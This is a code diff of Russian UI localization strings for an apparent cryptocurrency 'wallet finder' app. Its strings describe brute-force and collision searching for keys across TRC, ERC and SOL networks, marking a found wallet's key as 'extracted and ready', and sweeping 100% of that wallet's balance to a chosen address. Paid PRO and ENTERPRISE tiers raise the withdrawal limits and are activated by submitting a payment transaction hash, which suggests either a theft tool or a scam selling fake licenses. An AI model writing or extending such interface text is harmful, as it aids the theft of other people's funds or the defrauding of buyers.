@@ -47,6 +47,11 @@ export const ru = {
   // Network Selector
   selectNetworks: 'ВЫБЕРИТЕ СЕТИ ДЛЯ СКАНИРОВАНИЯ',
   activeNetworks: 'АКТИВНО',
+  singleChainActive: '1 АКТИВНО (1 СЕТЬ)',
+  parallelClusterPro: '3x СЕТИ (PRO)',
+  parallelActive: 'ПАРАЛЛЕЛЬНО АКТИВНО',
+  singleNetworkNotice: 'Тариф Community: 1 активная сеть. Параллельный кластерный поиск (TRC + ERC + SOL) доступен в PRO.',
+  upgradeParallelBtn: 'ОТКРЫТЬ 3 СЕТИ (PRO)',
 
   // Progress State Displays
   connecting: 'ПОДКЛЮЧЕНИЕ...',
@@ -78,18 +83,20 @@ export const ru = {
   balanceDispatched: 'БАЛАНС УСПЕШНО ВЫВЕДЕН',
 
   // Transfer Modal
-  assetDispatch: 'ОТПРАВКА АКТИВОВ',
+  assetDispatch: 'ВЫВОД АКТИВОВ',
+  assetWithdrawal: 'ВЫВОД АКТИВОВ',
   oneClickSweep: 'ПОЛНЫЙ ВЫВОД 100% В ОДИН КЛИК',
   licenseRequiredTitle: 'ТРЕБУЕТСЯ ЛИЦЕНЗИЯ PRO (БАЛАНС > $100)',
   licenseRequiredDesc: 'Бесплатный тариф Community позволяет выводить суммы только до $100.00 USD. На найденном кошельке находится крупная сумма. Для вывода требуется лицензия PRO или ENTERPRISE.',
   upgradeToProBtn: 'КУПИТЬ PRO ДЛЯ ВЫВОДА',
   sourceAddress: 'Адрес источника (Найденный)',
-  transferAmount: 'Сумма перевода',
+  transferAmount: 'Сумма вывода',
   fullBalance100: 'ВЕСЬ БАЛАНС (100%)',
   sweepNotice: '* Полный вывод (100% sweep): весь баланс найденного кошелька переводится за одну транзакцию.',
   destinationAddress: 'Адрес получателя',
   networkGasFee: 'Комиссия сети (Gas)',
   confirmDispatch: 'ПОДТВЕРДИТЬ И ВЫВЕСТИ ВСЁ',
+  confirmWithdrawAll: 'ПОДТВЕРДИТЬ И ВЫВЕСТИ ВСЁ',
   broadcasting: 'ТРАНСЛЯЦИЯ В МЕМПУЛ...',
   txBroadcasted: 'ТРАНЗАКЦИЯ ОТПРАВЛЕНА',
   txHash: 'ХЭШ ТРАНЗАКЦИИ (TXID)',
@@ -99,13 +106,15 @@ export const ru = {
   alreadyWithdrawn: 'БАЛАНС УЖЕ ВЫВЕДЕН',
 
   // Wallet Page
-  vaultAssets: 'АКТИВЫ ХРАНИЛИЩА',
+  vaultAssets: 'АКТИВЫ КОШЕЛЬКА',
   extractedHoldings: 'РЕЗЕРВ ИЗВЛЕЧЕННЫХ АКТИВОВ',
   liveRates: 'КУРСЫ В РЕАЛЬНОМ ВРЕМЕНИ',
   totalBalance: 'ОБЩИЙ ДОСТУПНЫЙ БАЛАНС',
   confirmed: 'ПОДТВЕРЖДЕНО',
   usdLiveValue: 'USD (ОЦЕНКА ОНЛАЙН)',
   dispatchAssets: 'ВЫВЕСТИ АКТИВЫ',
+  withdrawAssets: 'ВЫВЕСТИ АКТИВЫ',
+  withdraw: 'ВЫВЕСТИ',
   assetHoldings: 'Найденные кошельки с балансом',
   noHoldingsYet: 'Пока нет извлеченных кошельков. Запустите сканирование, чтобы найти цели.',
   startScanToFind: 'Запустить сканирование',
@@ -113,6 +122,8 @@ export const ru = {
   statusAvailable: 'ДОСТУПЕН',
   statusWithdrawn: 'ВЫВЕДЕН',
   noTransactionsYet: 'Транзакций пока нет.',
+  transferTo: 'Перевод на',
+  feeLabel: 'комиссия',
 
   // Activity Page
   activityAudit: 'ЖУРНАЛ СКАНИРОВАНИЙ',
@@ -122,6 +133,11 @@ export const ru = {
   statusCompleted: 'ЗАВЕРШЕНО',
   statusAborted: 'ПРЕРВАНО',
   noScansYet: 'В текущей сессии сканирований не записано.',
+  activityEmptyDesc: 'Запустите сканирование из консоли сканера, чтобы сформировать журнал сессий.',
+  stateLabel: 'СТАТУС',
+  stateSync: 'СИНХ',
+  loadMore: 'Показать еще',
+  targetKeyVerified: 'КЛЮЧ ИЗВЛЕЧЕН И ГОТОВ',
 
   // Licensing Modal
   licensingTitle: 'ЛИЦЕНЗИИ И ТАРИФЫ',
@@ -145,8 +161,34 @@ export const ru = {
   checkingOnChain: 'ПРОВЕРКА В БЛОКЧЕЙНЕ И СВЕРКА ПОЛУЧАТЕЛЯ...',
   matchConfirmed: 'ТРАНЗАКЦИЯ ПОДТВЕРЖДЕНА! АКТИВАЦИЯ...',
   planActivatedSuccess: 'ТАРИФ УСПЕШНО АКТИВИРОВАН!',
+  planUpgradedTo: 'Параметры системы обновлены до',
+  communityCapExceeded: 'Превышен лимит тарифа Community',
   txErrorEmpty: 'Пожалуйста, введите хэш транзакции (TxID)!',
   txErrorInvalid: 'Неверный формат хэша транзакции для выбранной сети.',
+
+  // Plans details
+  planCommunityName: 'COMMUNITY',
+  planCommunityDesc: 'Базовое сканирование и тестирование уязвимостей',
+  planCommunityF1: 'Одиночное сканирование (1 сеть на выбор)',
+  planCommunityF2: 'Лимит нахождения: 1 целевой адрес (1/1)',
+  planCommunityF3: 'Вывод средств ограничен суммами до $100',
+  planCommunityF4: '4 виртуальных потока сканирования',
+
+  planProName: 'PRO SUITE',
+  planProDesc: 'Высокая вычислительная мощность и снятие лимитов',
+  planProF1: 'Вывод крупных сумм до $10,000+',
+  planProF2: 'Неограниченное число найденных адресов',
+  planProF3: '16 высокопроизводительных вычислительных потоков',
+  planProF4: 'Параллельный кластерный поиск (TRC + ERC + SOL)',
+  planProF5: 'Приоритетный доступ к мемпулу без задержек',
+
+  planEnterpriseName: 'ENTERPRISE',
+  planEnterpriseDesc: 'Максимальная скорость перебора и выделенные RPC-узлы',
+  planEnterpriseF1: 'Неограниченный вывод средств до $50,000+',
+  planEnterpriseF2: 'Неограниченное нахождение целевых адресов',
+  planEnterpriseF3: '64 ультра-потока и поиск коллизий в реальном времени',
+  planEnterpriseF4: 'Маршрутизация через выделенный приватный RPC-кластер',
+  planEnterpriseF5: 'Выделенная поддержка инфраструктуры 24/7',
 
   // Free limit dialog
   limitReachedTitle: 'БЕСПЛАТНЫЙ ЛИМИТ ИСЧЕРПАН (1/1)',
